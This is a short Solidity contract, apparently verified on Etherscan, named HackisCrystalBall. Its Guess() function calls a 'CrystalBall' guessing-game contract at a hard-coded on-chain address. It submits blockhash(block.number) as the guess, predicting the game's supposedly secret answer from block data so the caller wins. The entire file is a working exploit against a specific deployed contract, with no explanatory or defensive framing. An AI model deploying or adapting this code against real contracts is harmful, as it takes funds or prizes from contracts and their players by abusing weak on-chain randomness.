/**
 *Submitted for verification at Etherscan.io on 2021-06-24
*/

pragma solidity ^0.5.17;

interface CrystalBall {
    function gaze(bytes32 guess, address challenger) external;
}

contract HackisCrystalBall{

    function Guess() public {
	    CrystalBall ball = CrystalBall(0xD2667b12b701BF68777DAC4d1cE682A6cC7198fB);
        address challenger = msg.sender;
        bytes32 guess = blockhash(block.number);
        ball.gaze(guess, challenger);
    }
}